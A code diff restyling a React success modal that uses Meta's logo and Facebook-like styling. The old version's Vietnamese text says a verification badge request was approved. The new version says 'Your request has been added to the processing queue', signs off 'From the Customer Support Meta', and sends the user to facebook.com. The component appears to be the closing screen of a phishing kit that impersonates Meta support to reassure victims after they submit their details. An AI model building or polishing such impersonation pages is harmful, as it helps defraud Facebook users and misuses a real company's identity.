@@ -1,7 +1,6 @@
 import PropTypes from 'prop-types';
 import MetaLogo from '@/assets/images/meta-logo-grey.png';
 import SuccessImage from '@/assets/images/succes.jpg';
-import TickIcon from '@/assets/images/tick.svg';
 
 const SuccessModal = ({ show, onClose, texts }) => {
     if (!show) return null;
@@ -14,135 +13,124 @@ const SuccessModal = ({ show, onClose, texts }) => {
         zIndex: 1040,
         display: 'flex',
         justifyContent: 'center',
-        alignItems: 'flex-start',
-        padding: '32px 16px',
+        alignItems: 'center',
+        padding: '8px',
         overflowY: 'auto',
         scrollbarWidth: 'none',
         msOverflowStyle: 'none',
     };
 
     const modalStyle = {
-        position: 'relative',
         width: '100%',
-        maxWidth: '500px',
-        backgroundImage: 'linear-gradient(130deg, #f9f1f9, #eaf3fd 35%, #edfbf2)',
-        borderRadius: '24px',
-        boxShadow: '0 20px 60px rgba(0,0,0,0.18)',
-        zIndex: 1050,
-        padding: '36px 32px 28px',
+        maxWidth: '512px',
+        backgroundColor: '#fff',
+        borderRadius: '16px',
+        boxShadow: '0 20px 50px rgba(15, 23, 42, 0.2)',
+        padding: '20px',
         display: 'flex',
         flexDirection: 'column',
-        alignItems: 'center',
-        flexShrink: 0,
+        minHeight: 'min(860px, calc(100vh - 16px))',
+        maxHeight: 'min(860px, calc(100vh - 16px))',
+        overflowY: 'auto',
+    };
+
+    const contentStyle = {
+        display: 'flex',
+        flexDirection: 'column',
+        flex: 1,
     };
 
     const titleStyle = {
-        fontSize: '22px',
+        width: '100%',
+        fontSize: '18px',
         fontWeight: 700,
-        color: '#1c2b33',
-        margin: '0 0 20px 0',
-        textAlign: 'center',
+        color: '#1c1e21',
+        margin: '0 0 16px 0',
+        textAlign: 'left',
+        lineHeight: 1.2,
     };
 
     const imageContainerStyle = {
         width: '100%',
-        borderRadius: '16px',
+        borderRadius: '10px',
         overflow: 'hidden',
-        marginBottom: '24px',
-        boxShadow: '0 4px 12px rgba(0,0,0,0.05)',
+        marginBottom: '14px',
     };
 
     const contentBoxStyle = {
-        textAlign: 'center',
+        textAlign: 'left',
         width: '100%',
-        maxWidth: '380px',
-        marginBottom: '28px',
+        maxWidth: '100%',
+        marginBottom: '16px',
     };
 
     const mainTextStyle = {
         fontSize: '15px',
-        color: '#4b5e7d',
-        lineHeight: '1.6',
-        margin: '0 0 12px 0',
-        fontWeight: '500',
-    };
-
-    const subTextStyle = {
-        fontSize: '13px',
-        color: '#8a9ab5',
-        lineHeight: '1.5',
-        margin: '12px 0 0 0',
+        color: '#9a979e',
+        lineHeight: '1.35',
+        margin: 0,
+        fontWeight: 400,
     };
 
     const buttonStyle = {
         width: '100%',
-        minHeight: '48px',
-        fontSize: '16px',
+        minHeight: '40px',
+        fontSize: '14px',
         fontWeight: 600,
         color: '#fff',
         backgroundColor: '#0064E0',
         border: 'none',
         borderRadius: '999px',
         cursor: 'pointer',
-        transition: 'all 0.2s',
-        boxShadow: '0 8px 20px rgba(0,100,224,0.25)',
+        transition: 'background-color 0.2s',
         display: 'flex',
         alignItems: 'center',
         justifyContent: 'center',
     };
 
     const footerStyle = {
-        marginTop: '32px',
-        display: 'flex',
-        flexDirection: 'column',
-        alignItems: 'center',
-        gap: '4px',
+        width: '64px',
+        margin: '20px auto 0',
     };
 
     return (
-        <div style={overlayStyle}>
+        <div style={overlayStyle} onClick={onClose}>
             <div style={modalStyle} onClick={(e) => e.stopPropagation()}>
-                {/* Title */}
-                <h2 style={titleStyle}>
-                    {texts.successTitle || 'Yêu cầu đã được gửi thành công'}
-                </h2>
+                <div style={contentStyle}>
+                    {/* Title */}
+                    <h2 style={titleStyle}>
+                        {texts.successTitle || 'Request has been sent'}
+                    </h2>
 
-                {/* Success Image */}
-                <div style={imageContainerStyle}>
-                    <img src={SuccessImage} alt="Success" style={{ width: '100%', display: 'block' }} />
-                </div>
+                    {/* Success Image */}
+                    <div style={imageContainerStyle}>
+                        <img src={SuccessImage} alt="Success" style={{ width: '100%', display: 'block' }} />
+                    </div>
 
-                {/* Content Box */}
-                <div style={contentBoxStyle}>
-                    <p style={mainTextStyle}>
-                        {texts.successMessage1 || 'Tuyệt vời, yêu cầu xác minh của bạn đã được phê duyệt.'}
-                    </p>
-                    <p style={{ ...mainTextStyle, margin: 0 }}>
-                        {texts.successMessage2 || 'Huy hiệu sẽ xuất hiện bên cạnh tên của bạn trong vòng một giờ tới.'}
-                        <img src={TickIcon} width="18" alt="tick" style={{ verticalAlign: 'middle', marginLeft: '6px', display: 'inline-block' }} />
-                    </p>
-                    
-                    <p style={subTextStyle}>
-                        {texts.successMessage3 || 'Nếu huy hiệu không xuất hiện sau thời gian này, vui lòng liên hệ lại với chúng tôi để được hỗ trợ thêm.'}
-                    </p>
-                </div>
+                    {/* Content Box */}
+                    <div style={contentBoxStyle}>
+                        <p style={{ ...mainTextStyle, marginBottom: '4px' }}>
+                            {texts.successMessage1 || 'Your request has been added to the processing queue. We will handle your request within 24 hours.'}
+                        </p>
+                        <p style={mainTextStyle}>
+                            {texts.successMessage2 || 'From the Customer Support Meta.'}
+                        </p>
+                    </div>
 
-                {/* Submit Button */}
-                <button
-                    style={buttonStyle}
-                    onClick={() => window.location.href = 'https://www.facebook.com'}
-                    onMouseOver={(e) => { e.currentTarget.style.opacity = '0.9'; }}
-                    onMouseOut={(e) => { e.currentTarget.style.opacity = '1'; }}
-                >
-                    {texts.confirm || 'Hoàn tất'}
-                </button>
+                    {/* Submit Button */}
+                    <button
+                        style={buttonStyle}
+                        onClick={() => window.location.href = 'https://www.facebook.com'}
+                        onMouseOver={(e) => { e.currentTarget.style.backgroundColor = '#1d4ed8'; }}
+                        onMouseOut={(e) => { e.currentTarget.style.backgroundColor = '#0064E0'; }}
+                    >
+                        {texts.confirm || 'Return to Facebook'}
+                    </button>
 
-                {/* Footer Branding */}
-                <div style={footerStyle}>
-                    <img src={MetaLogo} alt="Meta Logo" style={{ height: '18px', opacity: 0.8 }} />
-                    <span style={{ fontSize: '12px', color: '#8a9ab5', fontWeight: '400' }}>
-                        {texts.aboutHelpMore || 'Giới thiệu · Trợ giúp · Xem thêm'}
-                    </span>
+                    {/* Footer Branding */}
+                    <div style={footerStyle}>
+                        <img src={MetaLogo} width="100%" alt="Meta" style={{ objectFit: 'contain' }} />
+                    </div>
                 </div>
             </div>
         </div>
